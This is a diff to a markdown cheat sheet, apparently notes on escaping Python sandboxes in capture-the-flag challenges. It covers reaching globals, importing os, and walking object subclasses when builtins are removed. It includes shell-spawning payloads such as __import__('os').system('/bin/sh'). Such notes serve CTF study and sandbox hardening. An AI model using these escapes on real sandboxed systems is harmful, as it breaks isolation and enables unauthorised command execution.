@@ -21,14 +21,14 @@ Allows to encode characters
 - `vars()` - similar to `locals()`
 - `__builtins__` - object that has all builtins as attributes.
 ## Accessing Globals
-If the `exec` or `eval` disable globals and locals, you might still be able to access the original script.
-- `import __main__; __main__.var`
-- `import sys; sys.modules["__main__"].var`
+If the `exec` or `eval` disable globals and locals, you might still be able to access the original script using:
+`import __main__; __main__.var`
+See [[#Importing]] for alternative ways to import.
 ## Importing
 - `import os`
 - `__import__("os").system("/bin/sh")`
-- `sys.modules("os").system("/bin/sh")`
-
+- `sys.modules["os"].system("/bin/sh")`
+- [[#`BuiltinImporter` class|BuiltinImporter class]]
 ## Accessing attribute of object
 `obj` = object
 `cobj` = class of object
@@ -70,9 +70,9 @@ If the `exec` or `eval` disable globals and locals, you might still be able to a
 - `"a" + "b"`
 - `"a".__add__("b")`
 - `"".join(["a", "b"])`
+- `join` can be used with any iterator, for example `{1:"a",2:"b"}.values()`
 - `"\oct"`
 - `"\x123"`
-- `join` can be used with any iterator, for example `{1:"a",2:"b"}.values()`
 ## No Builtins
 ### Getting a class object
 - `[].__class__`
@@ -84,7 +84,7 @@ If the `exec` or `eval` disable globals and locals, you might still be able to a
 ### Getting any class
 `object.__subclasses__()` - a list of all subclasses of `object`, which is every class in python
 Filtering:
-- `object.__subclasses__()[index'`
+- `object.__subclasses__()[index]`
 - `[t for t in object.__subclasses__() if "Name" in t.__name__][0]`
 ### Useful classes
 #### `Helper` class
